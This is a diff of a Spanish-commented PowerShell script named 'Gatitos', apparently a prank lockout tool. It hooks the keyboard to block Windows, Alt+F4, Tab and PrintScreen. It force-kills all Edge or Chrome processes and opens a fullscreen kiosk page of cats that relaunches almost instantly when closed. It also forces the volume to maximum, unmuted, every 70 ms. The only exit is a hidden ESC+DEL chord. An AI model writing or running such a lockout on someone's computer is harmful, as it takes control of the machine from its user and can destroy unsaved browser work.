@@ -1,33 +1,35 @@
 <#
-  run.ps1 - Gatitos desde https://gatitos-eight.vercel.app
-  - Página propia (sin YouTube)
-  - Volumen 100%
-  - Reopen casi instantáneo
-  - Bloqueo básico de teclas
+  run.ps1 - Gatitos (https://gatitos-eight.vercel.app)
+  Única salida: ESC + DEL juntos
+  Reopen casi instantáneo + bloqueo de teclas
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
 
-# ===================== CONFIGURACIÓN =====================
 $pageUrl = 'https://gatitos-eight.vercel.app'
 $titulo  = 'Gatitos'
-# ========================================================
-
 $perfil  = Join-Path $env:TEMP 'venice_kiosk'
 
-# ---------------- Bloqueo de teclas ----------------
+# ---------------- Bloqueo de teclas + detección ESC+DEL ----------------
 Add-Type -TypeDefinition @'
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 public static class KeyBlocker {
   private const int WH_KEYBOARD_LL = 13;
   private const int WM_KEYDOWN = 0x0100;
   private const int WM_SYSKEYDOWN = 0x0104;
+
   private static LowLevelKeyboardProc _proc = HookCallback;
   private static IntPtr _hookID = IntPtr.Zero;
+
+  // Para detectar ESC + DEL
+  public static long lastEsc = 0;
+  public static long lastDel = 0;
+  public static bool shouldExit = false;
 
   public static void Start() { _hookID = SetHook(_proc); }
   public static void Stop()  { UnhookWindowsHookEx(_hookID); }
@@ -44,9 +46,26 @@ public static class KeyBlocker {
   private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
     if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
       int vk = Marshal.ReadInt32(lParam);
-      // Win, Alt+F4, Esc, Tab, Delete
-      if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x1B || vk == 0x09 || vk == 0x2E) {
-        return (IntPtr)1;
+      long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+
+      // Detectar ESC + DEL (margen 700ms)
+      if (vk == 0x1B) { // ESC
+        lastEsc = now;
+        if (now - lastDel < 700) shouldExit = true;
+      }
+      if (vk == 0x2E) { // DEL
+        lastDel = now;
+        if (now - lastEsc < 700) shouldExit = true;
+      }
+
+      // Bloquear teclas peligrosas (excepto ESC y DEL para poder detectarlos)
+      // Win, Alt+F4, Tab, Ctrl+Esc, etc.
+      if (vk == 0x5B || vk == 0x5C ||   // Left/Right Windows
+          vk == 0x73 ||                 // F4
+          vk == 0x09 ||                 // Tab
+          vk == 0x5D ||                 // Menu key
+          vk == 0x2C) {                 // PrintScreen
+        return (IntPtr)1; // bloquear
       }
     }
     return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -71,4 +90,95 @@ using System.Runtime.InteropServices;
 [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDevEnum { }
 [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 interface IMMDeviceEnumerator { int _1(); int GetDefaultAudioEndpoint(int flow, int role, out IMMDevice dev); }
-[Guid("D666063F-1587-4E43-81F1-B948E807
+[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+interface IMMDevice { int Activate(ref Guid iid, int ctx, IntPtr p, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
+[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+interface IAudioEndpointVolume {
+  int _1(); int _2(); int _3();
+  int SetMasterVolumeLevel(float f, IntPtr c);
+  int SetMasterVolumeLevelScalar(float f, IntPtr c);
+  int GetMasterVolumeLevel(out float f);
+  int GetMasterVolumeLevelScalar(out float f);
+  int _8(); int _9(); int _10(); int _11();
+  int SetMute(int m, IntPtr c);
+  int GetMute(out int m);
+}
+public static class Vol {
+  static IAudioEndpointVolume V() {
+    var e = (IMMDeviceEnumerator)(new MMDevEnum());
+    IMMDevice d; e.GetDefaultAudioEndpoint(0, 1, out d);
+    Guid iid = typeof(IAudioEndpointVolume).GUID;
+    object o; d.Activate(ref iid, 1, IntPtr.Zero, out o);
+    return (IAudioEndpointVolume)o;
+  }
+  public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
+}
+'@
+
+# ---------------- Navegador ----------------
+function Get-Nav {
+  $c = @(
+    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
+    "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
+    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
+    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
+    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
+  )
+  foreach ($p in $c) { if (Test-Path $p) { return $p } }
+  return $null
+}
+
+$nav = Get-Nav
+if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
+$procName = [IO.Path]::GetFileNameWithoutExtension($nav)
+
+$flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
+         "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
+         "--autoplay-policy=no-user-gesture-required --disable-infobars " +
+         "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
+if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
+
+$script:pidNav = 0
+
+function Lanzar {
+  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+  Start-Sleep -Milliseconds 120
+  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
+  if ($p) { $script:pidNav = $p.Id }
+}
+
+# Iniciar
+[KeyBlocker]::Start()
+Lanzar
+Start-Sleep -Milliseconds 700
+
+try {
+  while ($true) {
+    # ¿Se pidió salir con ESC + DEL?
+    if ([KeyBlocker]::shouldExit) {
+      break
+    }
+
+    [Vol]::Set(1.0)
+
+    $alive = $false
+    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
+    foreach ($p in $procs) {
+      if ($p.Id -eq $script:pidNav -or $p.MainWindowTitle -like "*$titulo*") {
+        $alive = $true
+        break
+      }
+    }
+
+    if (-not $alive) {
+      Lanzar
+      Start-Sleep -Milliseconds 250
+    }
+
+    Start-Sleep -Milliseconds 70
+  }
+}
+finally {
+  [KeyBlocker]::Stop()
+  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+}
